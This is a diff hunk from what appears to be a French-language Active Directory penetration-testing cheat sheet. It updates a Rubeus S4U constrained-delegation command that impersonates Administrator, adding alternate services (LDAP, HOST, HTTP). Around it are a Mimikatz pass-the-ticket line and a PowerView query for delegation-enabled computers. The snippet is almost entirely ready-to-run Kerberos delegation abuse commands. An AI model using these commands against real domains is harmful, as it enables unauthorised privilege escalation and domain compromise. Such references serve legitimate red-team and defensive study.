@@ -124,7 +124,7 @@ kerberos::ptt ticket.kirbi
 Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
 
 # Exploiter avec Rubeus si vous avez l'accès au compte
-.\Rubeus.exe s4u /user:serviceaccount$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/targetserver.domain.com /ptt
+.\Rubeus.exe s4u /user:serviceaccount$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/targetserver.domain.com /altservice:LDAP,HOST,HTTP /ptt
 ```
 ### Exploitation Exchange/ADCS
 #### Exchange (PrivExchange)
